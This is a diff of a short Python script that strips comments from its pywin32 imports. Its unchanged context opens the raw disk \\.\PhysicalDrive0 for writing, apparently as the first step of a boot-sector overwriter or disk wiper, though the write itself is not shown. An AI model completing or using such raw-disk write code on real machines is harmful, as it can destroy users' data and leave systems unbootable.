@@ -1,9 +1,9 @@
-from win32file import * # Features CreateFileW, a function that will be used
-from win32api import *  # CloseHandle, Sleep etc.
-from win32gui import *  # GDI functions, unused, however always great to import
-from win32con import *  # Constants like GENERIC_READ etc
-from win32ui import *   # Object oriented Windows API objects.
-import sys # Used to exit the current process. We might use ExitProcess(0), however this is more pythonic.
+from win32file import * 
+from win32api import *  
+from win32gui import *  
+from win32con import *  
+from win32ui import *   
+import sys 
 
 hDevice = CreateFileW(r"\\.\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING,
 					  0, 0)
